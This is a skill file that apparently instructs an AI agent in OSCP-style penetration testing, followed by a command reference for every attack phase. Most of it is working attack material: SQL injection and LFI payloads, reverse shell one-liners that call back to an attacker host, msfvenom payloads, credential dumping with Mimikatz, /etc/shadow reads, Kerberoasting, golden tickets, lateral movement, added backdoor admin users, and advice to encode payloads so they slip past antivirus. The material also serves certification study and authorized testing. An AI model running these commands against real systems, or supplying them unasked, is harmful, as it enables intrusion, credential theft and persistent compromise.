---
name: OSCP Penetration Testing Methodology
description: This skill should be used when the user asks to "perform OSCP-style penetration testing", "enumerate network services", "escalate privileges on Windows or Linux", "conduct Active Directory attacks", "transfer files between systems", "crack password hashes", or "execute lateral movement techniques". It provides a comprehensive methodology and command reference for offensive security certification preparation and real-world penetration testing.
version: 1.0.0
tags: [oscp, penetration-testing, enumeration, privilege-escalation, active-directory, lateral-movement]
---

# OSCP Penetration Testing Methodology

## Purpose

Execute comprehensive penetration testing engagements following OSCP methodology, covering reconnaissance, enumeration, exploitation, privilege escalation, and post-exploitation phases across Windows, Linux, and Active Directory environments. This skill provides actionable commands and techniques for each phase of a professional penetration test.

## Inputs / Prerequisites

### Required Tools
- Kali Linux or equivalent attack platform
- Nmap, Gobuster, Nikto for enumeration
- Metasploit Framework, Impacket suite
- Mimikatz, BloodHound, PowerView for AD attacks
- Hashcat, John the Ripper for password cracking

### Environment Requirements
- Network access to target systems
- Proper authorization documentation
- Note-taking application for findings
- File transfer capabilities established

## Outputs / Deliverables

### Primary Outputs
- Complete enumeration findings
- Exploited system access documentation
- Privilege escalation paths identified
- Lateral movement successful demonstrations

## Core Workflow

### Phase 1: Port Scanning and Enumeration

#### Initial Scanning

```bash
# Basic scan with version detection
nmap -sC -sV <IP> -v

# Complete scan all ports
nmap -T4 -A -p- <IP> -v

# Vulnerability scanning
sudo nmap -sV -p 443 --script "vuln" <IP>

# PowerShell port scan
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"}
```

### Phase 2: Service Enumeration

#### FTP Enumeration (Port 21)

```bash
# Connect and test anonymous access
ftp <IP>
# Try: anonymous / anonymous

# Nmap scripts
nmap -p21 --script=ftp-anon,ftp-bounce <IP>

# Brute force
hydra -L users.txt -P passwords.txt <IP> ftp
```

#### SSH Enumeration (Port 22)

```bash
# Connect with password
ssh user@IP

# Connect with key
chmod 600 id_rsa
ssh user@IP -i id_rsa

# Crack encrypted key
ssh2john id_rsa > hash
john --wordlist=rockyou.txt hash

# Brute force
hydra -l user -P passwords.txt <IP> ssh
```

#### SMB Enumeration (Port 445)

```bash
# NetBIOS scan
sudo nbtscan -r 192.168.50.0/24

# CrackMapExec enumeration
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --all

# SMBclient
smbclient -L //<IP>
smbclient //<IP>/share -U user

# Download all files from share
smbclient //<IP>/share -U user
> mask ""
> recurse ON
> prompt OFF
> mget *
```

#### HTTP/HTTPS Enumeration

```bash
# Directory discovery
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/big.txt
dirsearch -u http://<IP> -w wordlist.txt

# Vulnerability scanning
nikto -h <url>

# WordPress
wpscan --url "target" --enumerate vp,u,vt,tt

# Drupal
droopescan scan drupal -u http://site

# API fuzzing
gobuster dir -u http://<IP>:5002 -w big.txt -p pattern
curl -i http://<IP>:5002/users/v1
```

#### LDAP Enumeration (Port 389)

```bash
# Anonymous bind
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=domain,DC=com"

# Authenticated
ldapsearch -x -H ldap://<IP> -D 'DOMAIN\user' -w 'pass' -b "CN=Users,DC=domain,DC=com"

# windapsearch
python3 windapsearch.py --dc-ip <IP> -u user -p pass --users
python3 windapsearch.py --dc-ip <IP> -u user -p pass --da
```

#### SNMP Enumeration (Port 161)

```bash
snmpcheck -t <IP> -c public
snmpwalk -c public -v1 -t 10 <IP>
```

### Phase 3: Web Attacks

#### Directory Traversal

```bash
# Linux
http://target/page.php?file=../../../../../etc/passwd

# Windows
http://target/page.php?file=../../../../../Windows/System32/drivers/etc/hosts

# URL encoded
curl http://<IP>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Local File Inclusion (LFI)

```bash
# Log poisoning
http://<IP>/index.php?page=../../../../../var/log/apache2/access.log
# Inject PHP in User-Agent, then trigger via log

# PHP wrappers
curl "http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=config.php"
curl "http://<IP>/index.php?page=data://text/plain,<?php%20system('id');?>"
```

#### SQL Injection

```sql
-- Authentication bypass
admin' or '1'='1
' or '1'='1'--
" or "1"="1"--

-- Time-based detection
' AND IF (1=1, sleep(3),'false') -- 
```

#### SQLMap Exploitation

```bash
# Test parameter
sqlmap -u http://<IP>/page.php?id=1 -p id

# Dump database
sqlmap -u http://<IP>/page.php?id=1 -p id --dump

# OS shell
sqlmap -r request.txt -p item --os-shell --web-root "/var/www/html"
```

### Phase 4: Exploitation

#### Reverse Shell Payloads

```bash
# Windows executables
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Linux
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP
<?php echo shell_exec('bash -i >& /dev/tcp/<IP>/<PORT> 0>&1');?>
```

#### File Transfers

```bash
# Windows download
powershell -c Invoke-WebRequest -Uri http://<IP>/file -Outfile C:\temp\file
certutil -urlcache -split -f "http://<IP>/file" file

# Linux download
wget http://<IP>/file
curl http://<IP>/file -o output

# SMB transfer (Kali to Windows)
impacket-smbserver -smb2support share .
# Windows: copy \\<IP>\share\file .
```

### Phase 5: Windows Privilege Escalation

#### Automated Enumeration

```powershell
# Run winPEAS
.\winpeas.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#### Token Impersonation

```bash
# PrintSpoofer
PrintSpoofer.exe -i -c powershell.exe

# GodPotato
GodPotato.exe -cmd "shell.exe"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a
```

#### Service Exploitation

```powershell
# Unquoted service path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check permissions
icacls "C:\path\to\service"

# Modify and restart
sc config <service> binpath="C:\path\to\shell.exe"
sc start <service>
```

#### AlwaysInstallElevated

```powershell
# Check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

#### Credential Hunting

```powershell
# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Search for passwords
findstr /si password *.xml *.ini *.txt *.config

# Registry
reg query HKLM /f password /t REG_SZ /s

# Saved credentials
cmdkey /list
runas /savecred /user:admin C:\shell.exe
```

### Phase 6: Linux Privilege Escalation

#### TTY Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
```

#### Enumeration

```bash
# LinPEAS
./linpeas.sh

# Sudo
sudo -l

# SUID
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
```

#### Sensitive Files

```bash
# SSH keys
cat ~/.ssh/id_rsa
cat /root/.ssh/id_rsa

# Password files
cat /etc/passwd
cat /etc/shadow
```

### Phase 7: Active Directory Attacks

#### Enumeration with PowerView

```powershell
Import-Module .\PowerView.ps1

Get-NetDomain
Get-NetUser | select samaccountname
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

#### BloodHound Collection

```powershell
# SharpHound
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# bloodhound-python
bloodhound-python -u 'user' -p 'pass' -ns <DC-IP> -d domain.com -c all
```

#### Password Spraying

```bash
# CrackMapExec
crackmapexec smb <IP> -u users.txt -p 'Password123' -d domain --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.com users.txt "Password123"
```

#### AS-REP Roasting

```bash
# Impacket
impacket-GetNPUsers -dc-ip <DC-IP> domain/user:pass -request

# Crack hash
hashcat -m 18200 hash.txt rockyou.txt --force
```

#### Kerberoasting

```bash
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket
impacket-GetUserSPNs -dc-ip <DC-IP> domain/user:pass -request

# Crack
hashcat -m 13100 hashes.txt rockyou.txt --force
```

#### Lateral Movement

```bash
# psexec
psexec.py domain/user:pass@<IP>
psexec.py -hashes :NTLM_HASH domain/user@<IP>

# smbexec
smbexec.py domain/user:pass@<IP>

# wmiexec
wmiexec.py domain/user:pass@<IP>

# winrs (Windows)
winrs -r:<computer> -u:user -p:pass "cmd"
```

#### Mimikatz

```powershell
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch
```

#### Golden Ticket

```powershell
# Dump krbtgt hash
lsadump::lsa /inject /name:krbtgt

# Create ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### Phase 8: Password Cracking

#### Hashcat

```bash
# Identify hash type: https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m <mode> hash.txt rockyou.txt --force

# Common modes
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM
# 1800 = sha512crypt
# 13100 = Kerberoast
# 18200 = AS-REP
```

#### John the Ripper

```bash
# Convert formats
ssh2john id_rsa > hash
keepass2john Database.kdbx > hash

# Crack
john --wordlist=rockyou.txt hash
```

## Quick Reference

### Important Windows Locations
```
C:/Windows/repair/SAM
C:/Windows/System32/config/SAM
C:/Windows/Panther/Unattend.xml
C:/inetpub/wwwroot/web.config
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Important Linux Locations
```
/etc/passwd
/etc/shadow
/etc/crontab
/etc/exports
~/.ssh/id_rsa
~/.bash_history
/var/www/html/
```

### Adding Users
```bash
# Windows
net user hacker Password123 /add
net localgroup Administrators hacker /add

# Linux
useradd -u 0 -g 0 -o -d /root hacker
```

## Constraints and Guardrails

### Operational Boundaries
- Operate only within authorized scope
- Document all findings and actions
- Avoid denial of service conditions
- Report critical findings immediately

### Technical Limitations
- Some exploits require specific conditions
- AV/EDR may block common tools
- Network segmentation limits lateral movement
- Modern systems have enhanced protections

## Troubleshooting

### Shell Not Connecting
- Check firewall rules on both ends
- Try alternate ports (443, 80)
- Use encoded payloads to bypass AV

### Exploit Not Working
- Verify exact version matches
- Check architecture (x86 vs x64)
- Test in isolated environment first

### No Privilege Escalation Path
- Run multiple enumeration scripts
- Check manual techniques
- Look for credential reuse
- Consider kernel exploits as last resort
